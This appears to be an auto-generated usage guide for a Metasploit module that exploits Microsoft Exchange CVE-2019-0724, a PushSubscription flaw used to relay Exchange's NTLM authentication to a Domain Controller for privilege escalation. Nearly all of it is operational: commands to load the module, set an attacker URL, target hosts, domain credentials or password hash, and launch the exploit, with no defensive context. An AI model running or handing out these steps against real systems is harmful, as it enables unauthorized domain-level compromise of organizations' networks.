**The description of current metasploit exploit**
This module exploits a privilege escalation vulnerability found in Microsoft Exchange - CVE-2019-0724        Execution of the module will force Exchange to authenticate to an arbitrary URL over HTTP via the Exchange PushSubscription feature.        This allows us to relay the NTLM authentication to a Domain Controller and authenticate with the privileges that Exchange is configured.        The module is based on the work by @_dirkjan,

---

**The usage instruction:**

Start by loading the module:

```bash
use auxiliary/scanner/http/exchange_web_server_pushsubscription
```

Then set the required options:

```bash
# Required parameters with no default value
set ATTACKER_URL <your Attacker URL here>
set DOMAIN <your Active Directory domain name here>
set PASSWORD <your Password or password hash (in LM:NT format) here>
set RHOSTS <your Target host(s) here>
set USERNAME <your Username of any domain user with a mailbox on Exchange here>
```

Carefully review the following network-related parameters. These have default values but **may need to be changed** depending on your environment:

* RPORT – default: 443 - The target port (TCP)

If the defaults match your setup, you do **not** need to change them. Otherwise, override them using `set`.

Finally, run the exploit:

```bash
exploit
```
Note:
1. Please execute the command step by step.
2. You can change default value if need.
3. You need to pay attention to whether the default RPORT is consistent with the port where the current service is running.